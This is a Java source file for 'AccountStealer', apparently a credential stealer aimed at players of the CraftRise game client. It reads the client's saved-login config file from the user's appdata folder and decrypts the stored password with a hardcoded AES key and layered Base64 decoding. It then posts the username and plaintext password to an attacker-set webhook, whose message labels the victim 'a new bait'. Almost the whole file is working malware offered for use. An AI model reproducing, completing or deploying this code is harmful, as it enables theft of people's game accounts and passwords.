package io.github.itzgonza.impl;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.URL;
import java.util.function.Function;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.xml.bind.DatatypeConverter;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

/**
 * @author ItzGonza
 */
public class AccountStealer {
	
    public transient static AccountStealer instance;

    private String username, password, webhookURL, membershipPath;

    public AccountStealer() {
        username = "empty";
        password = "empty";
        webhookURL = "ur_webhook_url";
        membershipPath = System.getenv("appdata") + "/.craftrise/config.json";
    }

    public void initialize() throws Exception {
        File membershipFile = new File(membershipPath);
        
        if (!membershipFile.exists()) {
            System.err.println("Membership file not found.");
            return;
        }

        try (BufferedReader br = new BufferedReader(new FileReader(membershipFile))) {
            String str;
            StringBuilder sb = new StringBuilder();

            while ((str = br.readLine()) != null) {
                sb.append(str);
            }

            JsonObject obj = JsonParser.parseString(sb.toString()).getAsJsonObject();
            setUsername(obj.get("rememberName").getAsString());

            String encryptedPassword = obj.get("rememberPass").getAsString();
            setPassword(Decryptor.AES_ECB_PKCS5.decrypt(encryptedPassword));
        }
        
	synchronized ("Webhook Sender") {
		HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
		connection.addRequestProperty("Content-Type", "application/json");
		connection.addRequestProperty("User-Agent", "itzgonza1337.cu");
		connection.setRequestMethod("POST");
		connection.setDoOutput(true);
	    	
		connection.getOutputStream().write(String.format("{\"username\": \"gonz9\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\", \"content\": \"\", \"embeds\": [{\"title\": \"CraftRise Account Stealer :dash:\", \"color\":11298903, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_orange_diamond:Username **%s**\\n:small_orange_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/itzgonza\", \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903?v=4\"}, \"fields\": []}], \"components\": []}", getUsername(), getPassword(), getUsername()).getBytes());
	    	
		connection.getOutputStream().close();
		connection.getInputStream().close();
	};
    }

    private String getUsername() {
        return username != null && !username.isEmpty() ? username : new NullPointerException().getMessage();
    }

    private String getPassword() {
        return password != null && !password.isEmpty() ? password : new NullPointerException().getMessage();
    }

    private void setUsername(String username) {
        if (username != null && !username.isEmpty()) {
            this.username = username;
        } else {
            System.err.println("username is empty or null");
        }
    }

    private void setPassword(String password) {
        if (password != null && !password.isEmpty()) {
            this.password = password;
        } else {
            System.err.println("password is empty or null");
        }
    }

    public enum Decryptor {
    	
        AES_ECB_PKCS5 {
            @Override
            public String decrypt(String encryptedPassword) {
                Function<String, String> decryptAndRemovePrefix = (str) -> {
                    try {
                        byte[] key = "2640023187059250".getBytes("utf-8");
                        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
                        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
                        byte[] decryptedBytes = cipher.doFinal(DatatypeConverter.parseBase64Binary(str));
                        return new String(decryptedBytes);
                    } catch (Exception e) {
                        throw new RuntimeException("Decryption failed", e);
                    }
                };

                String decryptedString = decryptAndRemovePrefix
                    .andThen(Decryptor::getRiseVers)
                    .andThen(result -> result.split("#")[0])
                    .apply(encryptedPassword);

                return decryptedString;

            }
        };

        private static String getRiseVers(String input) {
        	Function<String, String> decryptAndRemovePrefix = (str) ->
        	decryptBase64(str)
        		.replace("3ebi2mclmAM7Ao2", "")
        		.replace("KweGTngiZOOj9d6", "");

        	String decodedString = decryptAndRemovePrefix
        			.andThen(decryptAndRemovePrefix)
        			.andThen(Decryptor::decryptBase64)
        			.apply(input);

        	return decodedString;
        }

        private static String decryptBase64(String input)  {
            try {
		return new String(Base64.decodeBase64(input), "utf-8");
	    } catch (Exception ignored) {return null;}
        }

        public abstract String decrypt(String encryptedPassword);
        
    }
    
}
